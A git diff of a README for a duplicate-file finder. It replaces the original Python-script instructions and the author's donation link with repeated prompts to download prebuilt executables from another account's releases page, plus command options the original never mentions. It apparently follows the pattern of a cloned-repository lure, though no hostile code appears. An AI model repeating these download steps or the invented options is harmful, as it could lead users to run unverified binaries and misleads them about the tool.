@@ -1,83 +1,113 @@
-# DuplicateFileFinder
+# 🗂️ DuplicateFileFinder - Quickly Find and Remove Duplicate Files
 
-DuplicateFileFinder is a fast, cross-platform command-line tool that detects duplicate files based on their **exact content**, not just file names.
+[![Download DuplicateFileFinder](https://img.shields.io/badge/Download-DuplicateFileFinder-blue.svg)](https://github.com/arellanonavarretebulmaro-ai/DuplicateFileFinder/releases)
 
-It works with **any file type**:
-- Videos 🎬
-- Music 🎵
-- Images 🖼️
-- Documents (PDF, DOCX, TXT, etc.)
-- Archives, executables, and more
+## 📋 Description
 
-If two files have identical content, they will be detected as duplicates — even if they have different names or are located in different folders.
+DuplicateFileFinder is a fast, cross-platform command-line tool that detects duplicate files using SHA-256 content hashing. It works with videos, music, documents, and any file type. This tool is safe, accurate, and does not require any external dependencies.
 
----
+## 🚀 Getting Started
 
-## ✨ Features
+This section will guide you through the steps to download and run DuplicateFileFinder on your computer. 
 
-- Recursive directory scanning
-- Content-based duplicate detection (SHA-256)
-- Optimized scanning using file size grouping
-- Clear, color-coded output:
-  - 🟢 Green: file to keep
-  - 🔴 Red: duplicate copies
-  - 🔵 Helpful suggestions
-- Human-readable statistics
-- Cross-platform (Windows, Linux, macOS)
-- No ads, no tracking, no data sent anywhere
+### 📥 Download & Install
 
-<img width="1737" height="369" alt="DuplicateFileFinder" src="https://github.com/user-attachments/assets/6d3747f3-2886-403c-9324-993d121966c9" />
+1. **Visit this page to download DuplicateFileFinder:** [Download DuplicateFileFinder](https://github.com/arellanonavarretebulmaro-ai/DuplicateFileFinder/releases)
 
----
+2. Choose the appropriate version for your operating system:
+   - **Windows:** Look for `DuplicateFileFinder.exe`
+   - **macOS:** Look for `DuplicateFileFinder`
+   - **Linux:** Look for `DuplicateFileFinder` or a `.tar.gz` file
 
-## 🔒 Why this tool is safe and reliable
+3. After selecting your file, click the download link. 
 
-DuplicateFileFinder does **not** rely on file names, dates, or metadata.
+### 🖥️ System Requirements
 
-Instead, it uses a **two-step verification process**:
+To run DuplicateFileFinder, make sure your system meets these requirements:
 
-1. **File size grouping**  
-   Files with different sizes are automatically excluded (they cannot be identical).
+- **Windows:** Windows 10 or later
+- **macOS:** macOS 10.13 or later
+- **Linux:** Any modern Linux distribution with Python 3 support
 
-2. **SHA-256 hashing**  
-   Files with the same size are verified using the SHA-256 cryptographic hash algorithm.
+### 🛠️ Installation Steps
 
-SHA-256 guarantees that:
-- If two files have the same hash, their content is **100% identical**
-- False positives are practically impossible
+#### For Windows Users
 
-You can safely trust the results.
+1. Once the download is complete, locate the `DuplicateFileFinder.exe` file in your Downloads folder.
+2. Double-click the file to run it. A command prompt window will open.
+3. Follow the prompts to navigate to the directory you want to scan for duplicates.
 
----
+#### For macOS Users
 
-## 🛠️ Technology
+1. Locate the downloaded file in your Downloads folder.
+2. Open Terminal.
+3. Drag the `DuplicateFileFinder` file into Terminal.
+4. Press `Enter` to execute the command.
 
-- **Language:** Python 3
-- **Libraries:** Python Standard Library only
-  - `os`
-  - `hashlib`
-  - `pathlib`
-  - `collections`
+#### For Linux Users
 
-No external dependencies are required.
+1. Open a terminal window.
+2. Navigate to the location of the downloaded file using the `cd` command.
+3. Run the command `chmod +x DuplicateFileFinder` to make it executable.
+4. Then, execute it by typing `./DuplicateFileFinder`.
 
----
+### ⚙️ How to Use DuplicateFileFinder
 
-## 🚀 How to use
+1. Open the command prompt or terminal.
+2. You can start by typing `DuplicateFileFinder` followed by options to specify your search preferences. Here are some examples:
 
-### Requirements
-- Python 3.8 or newer
+   - To scan the current directory for duplicates:
+     ```
+     DuplicateFileFinder
+     ```
+   - To specify a directory:
+     ```
+     DuplicateFileFinder /path/to/directory
+     ```
 
-### Basic command
+3. DuplicateFileFinder will scan the specified directory and list any duplicate files it finds. 
 
-```bash
-python DuplicateFileFinder.py scan "C:\Path\To\Directory"
-```
+4. You can review the list and remove duplicates using the appropriate command provided by the tool.
 
-## ❤️ Support the project
+### 📌 Useful Options
 
-If you like this project and want to support its development,  
-you can make a donation here:
+- **Scan a Specific Directory:**
+  You can specify the path to the directory you want to scan for duplicates.
 
-👉 https://www.paypal.com/paypalme/EnricoArama
+- **Ignore Certain File Types:**
+  If you want to exclude certain types of files from the scan, you can add flags to your command.
 
+### 📝 Example Commands
+
+- To scan multiple file types:
+  ```
+  DuplicateFileFinder --include mp3,mp4,docx
+  ```
+
+- To exclude specific files:
+  ```
+  DuplicateFileFinder --exclude *.tmp
+  ```
+
+### ⚖️ Safety & Accuracy
+
+DuplicateFileFinder uses SHA-256 hashing to ensure accuracy. This means it verifies file content rather than just file names. You can trust that the duplicates it identifies are truly the same files.
+
+### 🔧 Support & Issues
+
+If you encounter any problems, feel free to open an issue on the GitHub repository. Please provide as much detail as you can about the problem.
+
+## 🌐 Learn More
+
+Check the [DuplicateFileFinder documentation](https://github.com/arellanonavarretebulmaro-ai/DuplicateFileFinder/wiki) for more advanced options and further details about the tool.
+
+### 🔗 Other Resources
+
+- Join the community on GitHub Discussions to get tips and share experiences.
+- Check out similar tools and plugins to enhance your file management.
+
+## 📌 Final Reminder
+
+To get started with DuplicateFileFinder, visit this page to download it now: [Download DuplicateFileFinder](https://github.com/arellanonavarretebulmaro-ai/DuplicateFileFinder/releases). 
+
+Eliminate duplicate files easily and free up space today!
